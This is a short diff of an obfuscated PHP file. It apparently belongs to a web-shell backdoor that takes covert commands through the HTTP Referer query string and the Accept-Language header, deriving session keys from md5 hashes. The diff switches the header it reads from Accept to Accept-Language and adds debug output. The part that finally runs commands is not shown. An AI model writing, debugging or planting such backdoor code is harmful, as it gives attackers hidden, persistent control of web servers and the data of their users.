@@ -22,7 +22,7 @@ function x($t,$k){
 
 $r=$_SERVER;
 $rr=@$r["HTTP_REFERER"];
-$ra=@$r["HTTP_ACCEPT"];
+$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
 print("<${k}DEBUG>CHECK1 ?</${k}DEBUG>");
 if($rr&&$ra){
 	print("<${k}DEBUG>CHECK1 OK!</${k}DEBUG>");
@@ -32,7 +32,7 @@ if($rr&&$ra){
 	parse_str($u["query"],$q);
 	$q=array_values($q);
 	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
-	
+
 	print("<${k}DEBUG>ORDER: "); var_dump($q); var_dump($m[2]); print("</${k}DEBUG>");
 
 	print("<${k}DEBUG>CHECK2 ?</${k}DEBUG>");
@@ -43,7 +43,7 @@ if($rr&&$ra){
 		$s=&$_SESSION;
 		$ss="substr";
 		$sl="strtolower";
-		
+
 		$i=$m[1][0].$m[1][1];
 		$h=$sl($ss(md5($i.$kh),0,3));
 		$f=$sl($ss(md5($i.$kf),0,3));
